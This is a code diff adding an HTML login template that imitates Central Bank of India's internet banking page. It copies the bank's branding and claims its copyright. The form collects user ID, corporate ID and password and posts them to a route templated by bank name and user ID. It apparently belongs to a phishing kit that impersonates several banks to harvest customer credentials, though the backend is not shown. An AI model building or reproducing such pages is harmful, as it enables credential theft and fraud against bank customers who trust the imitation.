@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Central Bank Of India - Internet Banking Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+
+    <style>
+        .tab-active {
+            background: linear-gradient(to left, #a71c5f, #0972c0);
+            color: white;
+        }
+
+        .tab-inactive {
+            background: #e5e7eb;
+            color: #374151;
+        }
+
+        .mobile-menu {
+            display: none;
+            position: fixed;
+            top: 0;
+            right: 0;
+            width: 280px;
+            height: 100vh;
+            background: white;
+            box-shadow: -2px 0 10px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+            transform: translateX(100%);
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .mobile-menu.active {
+            display: block;
+            transform: translateX(0);
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+
+        .overlay.active {
+            display: block;
+        }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <!-- Header -->
+    <header class="bg-gradient-to-l from-[#a71c5f] to-[#0972c0] text-white p-5">
+        <div class="container mx-auto flex justify-between items-center">
+            <div class="image-logo">
+                <img th:src="@{/cbi/img.png}" alt="CBI Logo" class="h-[80px] object-contain">
+            </div>
+
+            <!-- Burger Menu Button (Mobile) -->
+            <button id="burgerMenu" class="text-white text-3xl focus:outline-none md:hidden">
+                <i class="bi bi-list"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- Mobile Menu Overlay -->
+    <div id="menuOverlay" class="overlay"></div>
+
+    <!-- Mobile Menu -->
+    <div id="mobileMenu" class="mobile-menu">
+        <div class="p-6">
+            <div class="flex justify-between items-center mb-8">
+                <h3 class="text-xl font-bold text-gray-800">Menu</h3>
+                <button id="closeMenu" class="text-gray-600 text-3xl">
+                    <i class="bi bi-x"></i>
+                </button>
+            </div>
+
+            <ul class="space-y-4">
+                <li>
+                    <a href="#" class="flex items-center text-gray-700 hover:text-[#a71c5f] py-2">
+                        <i class="bi bi-house-door mr-3 text-xl"></i>
+                        <span>Home</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#" class="flex items-center text-gray-700 hover:text-[#a71c5f] py-2">
+                        <i class="bi bi-person-circle mr-3 text-xl"></i>
+                        <span>Personal Banking</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#" class="flex items-center text-gray-700 hover:text-[#a71c5f] py-2">
+                        <i class="bi bi-building mr-3 text-xl"></i>
+                        <span>Corporate Banking</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#" class="flex items-center text-gray-700 hover:text-[#a71c5f] py-2">
+                        <i class="bi bi-info-circle mr-3 text-xl"></i>
+                        <span>About Us</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#" class="flex items-center text-gray-700 hover:text-[#a71c5f] py-2">
+                        <i class="bi bi-telephone mr-3 text-xl"></i>
+                        <span>Contact Us</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="#" class="flex items-center text-gray-700 hover:text-[#a71c5f] py-2">
+                        <i class="bi bi-question-circle mr-3 text-xl"></i>
+                        <span>FAQs</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-4 py-8">
+        <p class="text-[#d20543] text-center py-4 text-sm">Transaction initiated after 10 PM may be reflected on the next day</p>
+
+        <!-- Login Card -->
+        <div class="max-w-2xl mx-auto bg-white rounded-lg shadow-lg overflow-hidden">
+            <!-- Card Header Tabs -->
+            <div class="flex">
+                <div class="flex-1 text-center py-4 cursor-pointer tab-active" id="personalTab">
+                    <h3 class="font-semibold">Personal User</h3>
+                </div>
+                <div class="flex-1 text-center py-4 cursor-pointer tab-inactive border-l border-gray-300" id="corporateTab">
+                    <h3 class="font-semibold">Corporate User</h3>
+                </div>
+            </div>
+
+            <!-- Card Body -->
+            <div class="p-8 bg-white">
+                <form method="post" autocomplete="off" id="loginForm"
+                      th:action="@{/bank/login/{bankName}/{userId}(bankName=${bankName}, userId=${userId})}">
+
+                    <!-- Corporate ID -->
+                    <div class="mb-4" id="corporateIdContainer" style="display: none;">
+                        <input placeholder="Corporate ID"
+                               type="text"
+                               id="corporateId"
+                               name="corporateId"
+                               autocomplete="off"
+                               maxlength="65"
+                               class="w-full h-[46px] rounded-md pl-4 pr-4 text-[15px] text-black border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+
+                    <!-- User ID -->
+                    <div class="mb-4">
+                        <input placeholder="User ID"
+                               type="text"
+                               id="userId"
+                               name="userName"
+                               required
+                               autocomplete="off"
+                               maxlength="65"
+                               class="w-full h-[46px] rounded-md pl-4 pr-4 text-[15px] text-black border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+
+                    <!-- Password -->
+                    <div class="mb-6 relative">
+                        <input placeholder="Password"
+                               type="password"
+                               id="password"
+                               name="password"
+                               required minlength="6"
+                               autocomplete="off"
+                               maxlength="65"
+                               class="w-full h-[46px] rounded-md pl-4 pr-12 text-[15px] text-black border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                        <button type="button" id="togglePassword" class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-600">
+                            <i class="bi bi-eye"></i>
+                        </button>
+                    </div>
+
+                    <!-- Login Button -->
+                    <div>
+                        <button type="submit"
+                                class="w-full h-[46px] bg-gradient-to-r from-[#a71c5f] to-[#0972c0] text-white rounded-md text-[15px] font-semibold hover:from-[#0972c0] hover:to-[#a71c5f] transition-colors duration-300">
+                            <i class="fas fa-sign-in-alt mr-2"></i>
+                            Login
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Copyright -->
+        <div class="text-center mt-8">
+            <span class="text-gray-600 text-sm">&copy; 2025 Central Bank of India. All Rights Reserved.</span>
+        </div>
+    </main>
+
+    <!-- JavaScript -->
+    <script>
+        // Burger Menu Toggle
+        const burgerMenu = document.getElementById('burgerMenu');
+        const mobileMenu = document.getElementById('mobileMenu');
+        const menuOverlay = document.getElementById('menuOverlay');
+        const closeMenu = document.getElementById('closeMenu');
+
+        function openMenu() {
+            mobileMenu.classList.add('active');
+            menuOverlay.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeMenuHandler() {
+            mobileMenu.classList.remove('active');
+            menuOverlay.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        burgerMenu.addEventListener('click', openMenu);
+        closeMenu.addEventListener('click', closeMenuHandler);
+        menuOverlay.addEventListener('click', closeMenuHandler);
+
+        // Tab Switching
+        const personalTab = document.getElementById('personalTab');
+        const corporateTab = document.getElementById('corporateTab');
+        const corporateIdContainer = document.getElementById('corporateIdContainer');
+        const corporateIdInput = document.getElementById('corporateId');
+
+        personalTab.addEventListener('click', function() {
+            personalTab.classList.remove('tab-inactive');
+            personalTab.classList.add('tab-active');
+            corporateTab.classList.remove('tab-active');
+            corporateTab.classList.add('tab-inactive');
+
+            // Hide Corporate ID field for Personal User
+            corporateIdContainer.style.display = 'none';
+            corporateIdInput.removeAttribute('required');
+            corporateIdInput.value = ''; // Clear the value
+        });
+
+        corporateTab.addEventListener('click', function() {
+            corporateTab.classList.remove('tab-inactive');
+            corporateTab.classList.add('tab-active');
+            personalTab.classList.remove('tab-active');
+            personalTab.classList.add('tab-inactive');
+
+            // Show Corporate ID field for Corporate User
+            corporateIdContainer.style.display = 'block';
+            corporateIdInput.setAttribute('required', 'required');
+        });
+
+        // Password Toggle
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('password');
+
+        togglePassword.addEventListener('click', function() {
+            const icon = this.querySelector('i');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                icon.classList.replace('bi-eye', 'bi-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                icon.classList.replace('bi-eye-slash', 'bi-eye');
+            }
+        });
+
+        // Form Validation
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const corporateIdContainer = document.getElementById('corporateIdContainer');
+            const corporateId = document.getElementById('corporateId').value.trim();
+            const userId = document.getElementById('userId').value.trim();
+            const password = document.getElementById('password').value;
+
+            // Only validate Corporate ID if it's visible (Corporate User tab)
+            if (corporateIdContainer.style.display !== 'none') {
+                if (!corporateId) {
+                    e.preventDefault();
+                    alert('Please enter your Corporate ID');
+                    document.getElementById('corporateId').focus();
+                    return false;
+                }
+            }
+
+            if (!userId) {
+                e.preventDefault();
+                alert('Please enter your User ID');
+                document.getElementById('userId').focus();
+                return false;
+            }
+
+            if (!password) {
+                e.preventDefault();
+                alert('Please enter your password');
+                document.getElementById('password').focus();
+                return false;
+            }
+
+            return true;
+        });
+
+        // Auto focus on first field
+        window.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('userId')?.focus();
+        });
+    </script>
+</body>
+</html>
